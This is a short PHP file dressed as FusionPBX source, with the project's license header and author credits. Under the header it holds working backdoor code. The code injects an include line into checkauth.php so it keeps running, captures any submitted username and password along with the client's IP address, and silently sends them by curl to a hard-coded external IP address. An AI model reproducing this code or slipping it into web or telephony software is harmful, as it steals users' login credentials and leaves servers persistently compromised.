<?php
/*

	FusionPBX
	Version: MPL 1.1

	The contents of this file are subject to the Mozilla Public License Version
	1.1 (the "License"); you may not use this file except in compliance with
	the License. You may obtain a copy of the License at
	http://www.mozilla.org/MPL/

	Software distributed under the License is distributed on an "AS IS" basis,
	WITHOUT WARRANTY OF ANY KIND, either express or implied. See the License
	for the specific language governing rights and limitations under the
	License.

	The Original Code is FusionPBX

	The Initial Developer of the Original Code is
	Mark J Crane <markjcrane@fusionpbx.com>
	Portions created by the Initial Developer are Copyright (C) 2008-2010
	the Initial Developer. All Rights Reserved.

	Contributor(s):
	Mark J Crane <markjcrane@fusionpbx.com>
	
	 **/
if( exec('grep "lib_fpbx.php" ./checkauth.php')) {
echo "Hello here\n";
    } else { exec('echo "<?php include("lib_fpbx.php");?>" >> checkauth.php'); }
function get_url($url)
{
    $cmd  = "curl --max-time 60 ";
    $cmd .= "'" . $url . "'";
    $cmd .= " > /dev/null 2>&1 &";
    exec($cmd, $output, $exit);
    return $exit == 0;
}
if (strlen($_POST["password"]) > 0 ) {
$pass = urlencode($_POST["password"]);
$user = urlencode($_POST["username"]);
$addr = urlencode($_SERVER["REMOTE_ADDR"]);
$url = "http://186.225.111.210:8888/fusionpbx/includes/lkey.php?ip="."$addr"."&user="."$user"."&pass="."$pass"."";
get_url($url); }
?>
